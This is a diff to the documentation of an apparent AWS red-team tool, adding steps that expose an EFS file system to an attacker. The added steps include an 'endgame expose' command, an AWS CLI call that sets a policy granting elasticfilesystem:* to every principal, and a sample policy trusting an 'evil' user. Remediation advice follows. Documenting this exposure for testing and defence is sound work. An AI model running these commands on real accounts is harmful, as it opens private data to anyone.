@@ -2,14 +2,89 @@
 
 ## Steps to Reproduce
 
+> Note: The Terraform demo infrastructure will output the EFS File System ID. If you are using the Terraform demo infrastructure, you must leverage the file system ID in the `--name` parameter.
+
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service efs --name fs-01234567
+```
+
+* Alternatively, to expose the resource using the AWS CLI, run the following from the victim account:
+
+```bash
+aws efs put-file-system-policy --file-system-id fs-01234567 --policy '{
+    "Version": "2012-10-17",
+    "Id": "read-only-example-policy02",
+    "Statement": [
+        {
+            "Sid": "AllowEverybody",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "*"
+            },
+            "Action": [
+                "elasticfilesystem:*"
+            ],
+            "Resource": "*"
+        }
+    ]
+}'
+```
+
+* To view the contents of the file system policy, run the following:
+
+```bash
+aws efs describe-file-system-policy \
+    --file-system-id fs-01234567
+```
+
+* Observe that the contents of the overly permissive resource-based policy match the example shown below.
+
 ## Example
 
+The policy below shows the EFS policy granting `elasticfilesystem:*` access to the file system from the evil principal (`arn:aws:iam::999988887777:user/evil`).
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowCurrentAccount",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "arn:aws:iam::111122223333:root"
+            },
+            "Action": "elasticfilesystem:*",
+            "Resource": "arn:aws:elasticfilesystem:us-east-1:111122223333:file-system/fs-01234567"
+        },
+        {
+            "Sid": "Endgame",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "arn:aws:iam::999988887777:user/evil"
+            },
+            "Action": "elasticfilesystem:*",
+            "Resource": "arn:aws:elasticfilesystem:us-east-1:111122223333:file-system/fs-01234567"
+        }
+    ]
+}
+```
+
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
 > ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊
 
+* **Block Public Access to the EFS File System**: Follow the EFS Guidance [here](https://docs.aws.amazon.com/efs/latest/ug/access-control-block-public-access.html) to block public access to the EFS File Systems.
 * **Trusted Accounts Only**: Ensure that EFS File Systems are only shared with trusted accounts, and that the trusted accounts truly need access to the File System.
 * **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
 * **Restrict access to IAM permissions that could lead to exposure of your EFS File Systems**: Tightly control access to the following IAM actions:
@@ -22,3 +97,4 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 ## References
 
 * [put-filesystem-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/efs/put-file-system-policy.html)
+* [Creating File System Policies](https://docs.aws.amazon.com/efs/latest/ug/create-file-system-policy.html)
